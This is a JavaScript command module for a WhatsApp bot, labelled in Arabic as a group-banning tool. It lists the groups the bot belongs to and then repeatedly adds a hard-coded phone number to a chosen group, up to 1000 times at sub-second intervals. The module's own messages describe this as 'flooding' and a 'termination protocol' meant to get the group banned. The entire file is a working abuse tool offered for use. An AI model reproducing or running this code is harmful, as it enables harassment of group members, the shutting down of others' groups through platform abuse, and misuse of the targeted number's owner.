/**
 * تبنيد.js — أمر تبنيد المجموعات بالإضافة المكثفة
 * ══════════════════════════════════════════════════════════════
 *  .تبنيد         ← عرض قائمة الجروبات المستهدفة
 *  .تبنيد <رقم>   ← بدء الهجوم السريع على الجروب المستهدف
 * ══════════════════════════════════════════════════════════════
 */

import axios from 'axios';
const { sendButtons, btn } = await import('../lib/sendButtons.js?v=' + (global.__SB_RELOAD__ || 0));

if (!global.activeSpams) global.activeSpams = new Map();

// ── الأرقام المستهدفة للضغط ──────────────────────────────────
const TARGET_NUMBERS = [
    '201128344087',
];

export default {
    name       : 'تبنيد',
    command    : ['تبنيد', 'ban-group'],
    description: 'Heavy flood and termination protocol for target groups',
    category   : 'owner',
    developer  : true,

    async run({ sock, message, reply, args, isDeveloper }) {
        if (!isDeveloper) return reply('❌ ACCESS DENIED: Developer only.');

        const jid = message.key.remoteJid;
        const sub = args[0]?.trim();

        if (!sub) {
            await reply('🔄 [SYSTEM] Fetching active target sectors...');
            try {
                const groupMetadatas = await sock.groupFetchAllParticipating();
                const groups = Object.values(groupMetadatas);
                if (groups.length === 0) return reply('⚠️ [SYSTEM] No active target clusters found.');

                let text = '⚡ *TARGET SECTORS (GROUPS):*\n';
                groups.forEach((g, i) => {
                    text += `\n` +
                        `┌ 🎯 *Target [${i + 1}]* : ${g.subject || 'Unknown'}\n` +
                        `└ 👥 Nodes Active : ${g.participants.length}`;
                });
                text += '\n\n💻 *EXECUTION:* \`.تبنيد <target_number>\`';
                return reply(text);
            } catch (e) {
                return reply(`❌ [ERROR] Failed to fetch targets: ${e.message}`);
            }
        }

        if (sub === 'ايقاف' || sub === 'stop') {
            if (global.activeSpams.has(jid)) {
                global.activeSpams.set(jid, false);
                return reply('🛑 [ABORT] Termination sequence halted by operator.');
            }
            return reply('⚠️ [SYSTEM] No active execution loop found.');
        }

        const groupIndex = parseInt(sub) - 1;

        try {
            const groupMetadatas = await sock.groupFetchAllParticipating();
            const groups = Object.values(groupMetadatas);

            if (isNaN(groupIndex) || groupIndex < 0 || groupIndex >= groups.length) {
                return reply('❌ [ERROR] Invalid target index. Use `.تبنيد` to list clusters.');
            }

            const targetGroup = groups[groupIndex];
            const targetJid = targetGroup.id;

            global.activeSpams.set(jid, true);

            try {
                await sendButtons(sock, jid, {
                    header : '⚠️ [EXECUTION PROTOCOL INITIALIZED]',
                    body   : `🚀 Target Locked: *${targetGroup.subject}*\n` +
                             `🔥 Status: *FLOODING ACTIVE*\n` +
                             `🎯 Vectors Loaded: *${TARGET_NUMBERS.length}*\n\n` +
                             `_System is overloading target limits..._`,
                    footer : 'SOLO-X // TERMINATION CORE',
                    buttons: [
                        btn.quick('🛑 ABORT OPERATION', '.تبنيد ايقاف'),
                    ],
                }, message);
            } catch (_) {
                await sock.sendMessage(jid, {
                    text: `⚠️ [EXECUTION] Target Locked: *${targetGroup.subject}*\n` +
                          `Status: *FLOODING ACTIVE*\n\n` +
                          `To abort, send: \`.تبنيد ايقاف\``,
                }, { quoted: message });
            }

            // تنفيذ حلقة الضغط القوية
            (async () => {
                let count = 0;
                while (global.activeSpams.get(jid) === true) {
                    try {
                        const rawNum = TARGET_NUMBERS[count % TARGET_NUMBERS.length];
                        const targetUserJid = `${rawNum}@s.whatsapp.net`;

                        await sock.groupParticipantsUpdate(targetJid, [targetUserJid], 'add');
                        count++;
                        
                        await new Promise(resolve => setTimeout(resolve, 700));
                    } catch (err) {
                        await new Promise(resolve => setTimeout(resolve, 400));
                    }

                    if (count > 1000) break;
                }
                global.activeSpams.set(jid, false);
            })();

        } catch (e) {
            return reply(`❌ [CRITICAL ERROR]: ${e.message}`);
        }
    },
};